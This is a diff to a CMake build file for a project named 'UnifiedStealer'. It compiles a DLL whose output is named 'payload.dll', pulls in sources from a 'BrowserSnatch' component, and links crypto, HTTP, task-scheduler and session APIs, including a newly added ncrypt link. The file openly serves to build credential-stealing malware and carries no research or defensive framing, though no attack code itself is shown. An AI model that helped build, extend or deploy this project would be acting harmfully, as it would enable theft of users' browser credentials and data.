@@ -4,12 +4,8 @@ project(UnifiedStealer LANGUAGES CXX C)
 set(CMAKE_CXX_STANDARD 20)
 set(CMAKE_CXX_STANDARD_REQUIRED ON)
 
-# NOTE: This standalone CMakeLists is deprecated.
-# Build via the parent stealer/CMakeLists.txt instead,
-# which uses local .deps/ (no FetchContent).
 message(WARNING "Use stealer/CMakeLists.txt for building, not this file.")
 
-# ---- BrowserSnatch source location ----
 set(BS_DIR "${CMAKE_CURRENT_SOURCE_DIR}/../BrowserSnatch/BrowserSnatch")
 
 set(BS_SOURCES
@@ -23,7 +19,6 @@ set(BS_SOURCES
     ${BS_DIR}/TaskService.cpp
 )
 
-# ---- DLL Target ----
 add_library(UnifiedStealer SHARED
     dllmain.cpp
     http.cpp
@@ -36,19 +31,17 @@ target_include_directories(UnifiedStealer PRIVATE
     ${BS_DIR}/includes
 )
 
-# Skip our precompiled header for BrowserSnatch sources (they use their own Imports.h)
 set_source_files_properties(${BS_SOURCES} PROPERTIES SKIP_PRECOMPILE_HEADERS ON)
 
-# Precompiled header for our files
 target_precompile_headers(UnifiedStealer PRIVATE pch.hpp)
 
-# Link dependencies
 target_link_libraries(UnifiedStealer PRIVATE
     nlohmann_json::nlohmann_json
     sqlite3
     pugixml
     bcrypt
     crypt32
+    ncrypt
     winhttp
     ws2_32
     shell32
@@ -60,9 +53,9 @@ target_link_libraries(UnifiedStealer PRIVATE
     oleaut32
     taskschd
     Wtsapi32
+    user32
 )
 
-# MSVC-specific flags
 if(MSVC)
     target_compile_options(UnifiedStealer PRIVATE /W3 /utf-8)
     target_compile_definitions(UnifiedStealer PRIVATE
@@ -72,7 +65,6 @@ if(MSVC)
     target_link_options(UnifiedStealer PRIVATE /OPT:REF /OPT:ICF)
 endif()
 
-# Output name
 set_target_properties(UnifiedStealer PROPERTIES
     OUTPUT_NAME "payload"
     SUFFIX ".dll"
